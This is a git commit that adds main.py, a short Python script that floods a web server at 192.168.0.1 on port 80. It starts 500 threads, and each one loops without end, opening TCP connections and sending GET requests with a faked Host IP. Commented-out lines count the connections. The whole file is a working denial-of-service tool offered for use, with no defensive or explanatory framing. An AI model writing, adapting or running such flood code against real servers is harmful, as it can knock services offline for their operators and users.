2b722e1232b0ce10c67462daaf870c5a5974c489
david840706tw <develop.tung@gmail.com>
2020-11-29 02:52:21 +0800

    commit

---
+++ main.py
@@ -0,0 +1,31 @@
+import threading
+import socket
+
+target = '192.168.0.1'
+port = 80
+fack_ip = '182.21.20.32'
+
+already_connected = 0
+
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),
+                 (target, port))
+        s.sendto(("Host:" + fack_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+
+        # 測試 無限循環連接
+        # global already_connected
+        # already_connected += 1
+        # print(already_connected)
+
+        # if already_connected % 500 == 0:
+        #     print(already_connected)
+
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
